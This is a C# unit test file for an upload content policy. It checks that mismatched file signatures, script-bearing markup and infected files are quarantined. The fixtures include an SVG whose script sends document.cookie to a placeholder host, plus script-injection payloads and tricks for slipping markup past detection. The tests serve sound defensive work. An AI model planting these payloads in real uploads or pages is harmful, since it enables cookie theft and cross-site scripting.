using System.Text;
using AppTemplate.Application.Features.Files.Model.Policies;
using AppTemplate.Application.Features.Files.Ports.FileContentScanner;
using AppTemplate.Domain.Features.Files.Model.ValueObjects;
using Shouldly;
using Xunit;

namespace AppTemplate.Application.UnitTests.Features.Files.Model.Policies;

public sealed class StoredFileContentPolicyTests
{
    private static readonly byte[] _png = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00];
    private static readonly byte[] _jpeg = [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10];
    private static readonly byte[] _gif = Encoding.ASCII.GetBytes("GIF89a....");
    private static readonly byte[] _pdf = Encoding.ASCII.GetBytes("%PDF-1.7\n%\xE2\xE3\xCF\xD3");
    private static readonly byte[] _zip = [(byte)'P', (byte)'K', 0x03, 0x04, 0x14, 0x00];
    private static readonly byte[] _csv = Encoding.ASCII.GetBytes("id,name,total\n1,widget,9.99\n");

    private static readonly byte[] _svg = Encoding.ASCII.GetBytes(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\">" +
        "<script>fetch('https://example.invalid/'+document.cookie)</script></svg>");

    [Theory]
    [InlineData("image/png")]
    [InlineData("image/jpeg")]
    [InlineData("image/gif")]
    [InlineData("application/pdf")]
    public void ContentThatIsWhatItSaysItIs_IsReleased(string declared) =>
        Decide(declared, HeadFor(declared)).ShouldBe(ContentDecision.Release);

    [Fact]
    public void ContentThatNamesADifferentTypeThanWasDeclared_IsQuarantined() =>
        Decide("image/png", _jpeg).ShouldBe(ContentDecision.Quarantine);

    [Fact]
    public void ContentThatNamesNothing_IsQuarantinedWhenTheDeclaredTypeShouldHaveASignature() =>
        Decide("image/png", _csv).ShouldBe(ContentDecision.Quarantine);

    [Fact]
    public void ContentDeclaredAsAFormatWithNoSignature_IsReleased() =>
        Decide("text/csv", _csv).ShouldBe(ContentDecision.Release);

    [Fact]
    public void AZipBasedDocumentFormat_IsNotRefusedForBeingAZip() =>
        Decide(
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                _zip)
            .ShouldBe(ContentDecision.Release);

    [Fact]
    public void AZipDeclaredAsAnImage_IsStillQuarantined() =>
        Decide("image/png", _zip).ShouldBe(ContentDecision.Quarantine);

    [Fact]
    public void ANonCanonicalSpellingOfARecognisedType_IsRefused() =>
        Decide("image/jpg", _jpeg).ShouldBe(ContentDecision.Quarantine);

    [Fact]
    public void AnSvgDeclaredAsAnImage_IsQuarantined() =>
        Decide("image/png", _svg).ShouldBe(ContentDecision.Quarantine);

    [Fact]
    public void AnHonestlyDeclaredSvg_IsQuarantinedToo() =>
        Decide("image/svg+xml", _svg).ShouldBe(ContentDecision.Quarantine);

    [Theory]
    [InlineData("<!DOCTYPE html><html><body><script>alert(1)</script></body></html>")]
    [InlineData("<html><head><title>hello</title></head></html>")]
    [InlineData("   \n\n  <SVG xmlns=\"http://www.w3.org/2000/svg\"/>")]
    [InlineData("<?xml version=\"1.0\"?><!-- a comment long enough to push the markup along --><svg/>")]
    public void EveryShapeOfScriptContainer_IsQuarantined(string markup) =>
        Decide("text/plain", Encoding.ASCII.GetBytes(markup)).ShouldBe(ContentDecision.Quarantine);

    [Fact]
    public void AnSvgWithItsMarkupPaddedPastTheInspectedPrefix_IsStillQuarantined()
    {
        byte[] padded = Encoding.ASCII.GetBytes(
            "<?xml version=\"1.0\"?><!--"
            + new string('p', StoredFileContentPolicy.MaxHeadBytes * 2)
            + "--><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>");

        var inspected = padded.AsMemory(0, StoredFileContentPolicy.MaxHeadBytes);

        MediaTypeSignatures.IsScriptContainer(inspected.Span).ShouldBeFalse(
            "the premise of this test: within the prefix an adapter actually reads there is no " +
            "markup marker left to find. If this ever becomes true the test below stops proving " +
            "anything and should be rewritten rather than deleted.");

        Decide("text/plain", inspected).ShouldBe(
            ContentDecision.Quarantine,
            "the document still begins as markup, and offset zero is the one thing padding cannot " +
            "move. Releasing it would store a program and serve it under a type of the uploader's " +
            "choosing.");
    }

    [Fact]
    public void AnHonestXmlDocument_IsRefusedToo_BecauseNothingHereSanitisesMarkup() =>
        Decide("application/xml", Encoding.ASCII.GetBytes("<?xml version=\"1.0\"?><invoice total=\"9.99\"/>"))
            .ShouldBe(ContentDecision.Quarantine);

    [Theory]
    [InlineData(0xEF, 0xBB, 0xBF)]
    [InlineData(0xFF, 0xFE, 0x00)]
    public void MarkupBehindAByteOrderMark_IsStillMarkup(byte first, byte second, byte third)
    {
        byte[] marked = [first, second, third, .. Encoding.ASCII.GetBytes("<svg/>")];

        Decide("text/plain", marked).ShouldBe(ContentDecision.Quarantine);
    }

    [Fact]
    public void ADocumentThatOnlyMentionsATagLaterOn_IsNotRefusedForBeginningAsMarkup() =>
        Decide("text/csv", Encoding.ASCII.GetBytes("id,note\n1,\"see <the appendix>\"\n"))
            .ShouldBe(ContentDecision.Release);

    [Fact]
    public void AnSvgEncodedAsUtf16_IsStillRecognised()
    {
        byte[] utf16 = Encoding.Unicode.GetBytes("<svg xmlns=\"http://www.w3.org/2000/svg\"/>");

        Decide("text/plain", utf16).ShouldBe(ContentDecision.Quarantine);
    }

    [Fact]
    public void OrdinaryTextThatMentionsNoMarkup_IsNotMistakenForAScriptContainer() =>
        Decide("text/plain", Encoding.ASCII.GetBytes("Dear Sir, please find the invoice attached."))
            .ShouldBe(ContentDecision.Release);

    [Fact]
    public void InfectedContent_IsQuarantined() =>
        StoredFileContentPolicy.Decide(
                DeclaredMediaType.Create("image/png"),
                FileScanOutcome.Infected("Eicar-Test-Signature"),
                _png,
                verifySignature: true)
            .ShouldBe(ContentDecision.Quarantine);

    [Fact]
    public void ContentTheScannerRefusedToLookAt_IsQuarantined() =>
        StoredFileContentPolicy.Decide(
                DeclaredMediaType.Create("image/png"),
                FileScanOutcome.NotInspectable,
                _png,
                verifySignature: true)
            .ShouldBe(ContentDecision.Quarantine);

    [Fact]
    public void ContentThatCouldNotBeExaminedAtAll_IsRetriedRatherThanDecided() =>
        StoredFileContentPolicy.Decide(
                DeclaredMediaType.Create("image/png"),
                FileScanOutcome.Unavailable,
                ReadOnlySpan<byte>.Empty,
                verifySignature: true)
            .ShouldBe(ContentDecision.Retry);

    [Fact]
    public void AnOutageIsNeverMistakenForAFailedTypeCheck() =>
        StoredFileContentPolicy.Decide(
                DeclaredMediaType.Create("image/png"),
                FileScanOutcome.Unavailable,
                ReadOnlySpan<byte>.Empty,
                verifySignature: true)
            .ShouldNotBe(ContentDecision.Quarantine);

    [Fact]
    public void WithoutSignatureVerification_AMismatchedHeadIsReleased() =>
        Decide("image/png", _jpeg, verifySignature: false).ShouldBe(ContentDecision.Release);

    [Fact]
    public void WithoutSignatureVerification_AHeadThatNamesNothingIsReleased() =>
        Decide("image/png", _csv, verifySignature: false).ShouldBe(ContentDecision.Release);

    [Fact]
    public void WithoutSignatureVerification_MarkupIsStillQuarantined() =>
        Decide("image/svg+xml", _svg, verifySignature: false).ShouldBe(ContentDecision.Quarantine);

    [Fact]
    public void WithoutAScan_TheHeadAloneDecides()
    {
        StoredFileContentPolicy.Decide(DeclaredMediaType.Create("image/png"), null, _png, verifySignature: true)
            .ShouldBe(ContentDecision.Release);
        StoredFileContentPolicy.Decide(DeclaredMediaType.Create("image/png"), null, _svg, verifySignature: true)
            .ShouldBe(ContentDecision.Quarantine);
    }

    [Fact]
    public void WithoutSignatureVerification_AnInfectedFileIsStillQuarantined() =>
        Decide("image/png", _png, verifySignature: false, scan: FileScanOutcome.Infected("Eicar-Test-Signature"))
            .ShouldBe(ContentDecision.Quarantine);

    private static ContentDecision Decide(
        string declaredMediaType,
        ReadOnlyMemory<byte> head,
        bool verifySignature = true,
        FileScanOutcome? scan = null) =>
        StoredFileContentPolicy.Decide(
            DeclaredMediaType.Create(declaredMediaType),
            scan ?? FileScanOutcome.Clean,
            head.Span,
            verifySignature);

    private static byte[] HeadFor(string mediaType) => mediaType switch
    {
        "image/png" => _png,
        "image/jpeg" => _jpeg,
        "image/gif" => _gif,
        "application/pdf" => _pdf,
        _ => throw new ArgumentOutOfRangeException(nameof(mediaType), mediaType, "No sample for that type."),
    };
}
